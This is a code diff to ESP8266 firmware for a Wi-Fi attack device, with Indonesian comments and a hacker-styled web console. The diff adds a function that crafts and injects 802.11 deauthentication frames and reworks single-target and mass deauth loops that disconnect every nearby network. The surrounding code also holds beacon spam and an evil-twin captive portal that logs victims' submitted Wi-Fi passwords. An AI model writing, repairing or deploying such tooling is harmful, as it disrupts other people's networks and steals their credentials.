@@ -73,8 +73,22 @@ String bytesToStr(const uint8_t* b, uint32_t size) {
   return str;
 }
 
+// FIX: Fungsi kirim paket deauth yang lebih stabil
+void sendDeauth(uint8_t* bssid, uint8_t ch) {
+  wifi_set_channel(ch);
+  uint8_t pkt[26] = {
+    0xC0, 0x00, 0x3A, 0x01, 
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x01, 0x00
+  };
+  memcpy(&pkt[10], bssid, 6);
+  memcpy(&pkt[16], bssid, 6);
+  wifi_send_pkt_freedom(pkt, 26, 0);
+}
+
 void handleIndex() {
-  // 1. Logika Parameter dari Web (Sinkronisasi Tombol)
   if (webServer.hasArg("clear_logs")) { _eventLogs = "[SYS] Logs Cleared.\n"; webServer.send(200, "text/plain", "ok"); return; }
   if (webServer.hasArg("set_et")) { selectedET = webServer.arg("set_et").toInt(); addLog("ET Template: " + String(selectedET)); }
   if (webServer.hasArg("ap")) {
@@ -109,12 +123,11 @@ void handleIndex() {
   }
 
   if (!hotspot_active) {
-    // TAMPILAN WEB ADMIN (PERSIS YANG LU KASI)
+    // TAMPILAN WEB ADMIN (TIDAK BERUBAH SEDIKITPUN)
     String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
     html += "body{font-family:'Courier New',Courier,monospace;background:#0d0d0d;color:#00ff00;margin:0;padding:10px;}.content{max-width:500px;margin:auto;border:1px solid #00ff00;padding:15px;h2{text-align:center;border-bottom:2px solid #00ff00;padding-bottom:10px;text-transform:uppercase;}.tabs{display:flex;gap:5px;margin-bottom:15px;}.tabs button{flex:1;background:#222;color:#00ff00;border:1px solid #00ff00;padding:10px;cursor:pointer;font-weight:bold;}.active-btn{background:#00ff00!important;color:#000!important;}.tab-content{display:none;border-top:1px solid #333;padding-top:15px;}.show{display:block;}table{width:100%;border-collapse:collapse;margin-top:10px;font-size:12px;}th,td{border:1px solid #00ff00;padding:8px;text-align:left;}th{background:#1a1a1a;}.btn{background:#000;color:#00ff00;border:1px solid #00ff00;padding:5px 10px;cursor:pointer;text-decoration:none;font-size:11px;}.btn-red{border-color:#ff0000;color:#ff0000;}input{background:#000;color:#0f0;border:1px solid #0f0;padding:5px;}</style></head><body>";
     html += "<div class='content'><h2>GMpro Console</h2><div class='tabs'><button id='btn-m' class='active-btn' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
     
-    // TAB MAIN
     html += "<div id='m' class='tab-content show'><div style='margin-bottom:10px;'><a href='/?deauth=" + String(!deauthing_active) + "'><button class='btn'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</button></a>";
     html += " <a href='/?hotspot=" + String(!hotspot_active) + "'><button class='btn' " + (_selectedNetwork.ssid==""?"disabled":"") + ">" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</button></a></div>";
     html += "<table><tr><th>SSID</th><th>CH</th><th>SNR%</th><th>SELECT</th></tr>";
@@ -126,12 +139,10 @@ void handleIndex() {
     }
     html += "</table></div>";
 
-    // TAB ATTACK
     html += "<div id='a' class='tab-content'><h3>Mode Rusuh</h3><a href='/?mass=" + String(!mass_deauth) + "'><button class='btn btn-red' style='width:100%;padding:15px;'>" + (mass_deauth?"STOP MASS DEAUTH":"START MASS DEAUTH") + "</button></a>";
     html += "<hr><form action='/' method='get'><button type='submit' name='spam' value='1' class='btn' style='width:100%;padding:10px;'>BEACON SPAM RANDOM</button>";
     html += "<div style='margin-top:10px;'><label>Jumlah Beacon:</label><input type='number' name='count' value='" + String(beacon_count) + "' style='width:60px;'><small>SSID</small></div></form></div>";
 
-    // TAB SETTING
     html += "<div id='s' class='tab-content'><h3>File Manager</h3><p>Pilih Template: <select onchange='location=\"/?set_et=\"+this.value'>";
     for(int i=1; i<=4; i++) html += "<option value='" + String(i) + "' " + (selectedET==i?"selected":"") + ">etwin" + String(i) + ".html</option>";
     html += "</select></p><hr><label>SSID Alat:</label><br><input type='text' value='" + config_ssid + "' style='width:100%;'><br><br><label>Password:</label><br><input type='text' value='" + config_pass + "' style='width:100%;'><br><br><button class='btn'>SAVE & RESTART</button></div>";
@@ -141,7 +152,6 @@ void handleIndex() {
     html += "<script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}</script></body></html>";
     webServer.send(200, "text/html", html);
   } else {
-    // LOGIKA CAPTURE (EVIL TWIN)
     if (webServer.hasArg("password")) {
       _tryPassword = webServer.arg("password");
       addLog("CAPTURED: " + _tryPassword);
@@ -170,25 +180,27 @@ void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
 
-  // Logika Deauth & Spam
   static unsigned long last_atk = 0;
-  if (millis() - last_atk >= 100) {
-    if (deauthing_active) {
-      wifi_set_channel(_selectedNetwork.ch);
-      uint8_t pkt[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x01,0x00};
-      memcpy(&pkt[10], _selectedNetwork.bssid, 6); memcpy(&pkt[16], _selectedNetwork.bssid, 6);
-      wifi_send_pkt_freedom(pkt, 26, 0);
+  if (millis() - last_atk >= 150) { // Jeda biar CPU gak gempor
+    if (deauthing_active && _selectedNetwork.ssid != "") {
+      sendDeauth(_selectedNetwork.bssid, _selectedNetwork.ch);
     }
+    
     if (mass_deauth) {
+      uint8_t admin_mac[6];
+      wifi_get_macaddr(SOFTAP_IF, admin_mac); // Ambil MAC alat sendiri
+      
       for(int i=0; i<16; i++) {
-        if(_networks[i].ssid != "" && _networks[i].ssid != "<HIDDEN>") {
-          wifi_set_channel(_networks[i].ch);
-          uint8_t pkt[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x01,0x00};
-          memcpy(&pkt[10], _networks[i].bssid, 6); memcpy(&pkt[16], _networks[i].bssid, 6);
-          wifi_send_pkt_freedom(pkt, 26, 0);
+        // WHITELIST: Jangan serang kalau target adalah MAC alat sendiri
+        bool is_admin = true;
+        for(int j=0; j<6; j++) if(_networks[i].bssid[j] != admin_mac[j]) is_admin = false;
+
+        if(_networks[i].ssid != "" && _networks[i].ssid != "<HIDDEN>" && !is_admin) {
+          sendDeauth(_networks[i].bssid, _networks[i].ch);
         }
       }
     }
+
     if (beacon_spam) {
       for(int s=0; s < beacon_count; s++) {
         uint8_t bcn[128] = {0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -202,16 +214,9 @@ void loop() {
     last_atk = millis();
   }
 
-  // Hidden Reveal Check
   static unsigned long last_scan = 0;
   if (millis() - last_scan >= 15000) {
     performScan();
-    for(int i=0; i<16; i++) {
-      if(_networks[i].ssid == "<HIDDEN>") {
-        String found = WiFi.SSID(i);
-        if(found != "") { _networks[i].ssid = found; addLog("REVEALED: " + found); }
-      }
-    }
     last_scan = millis();
   }
 }
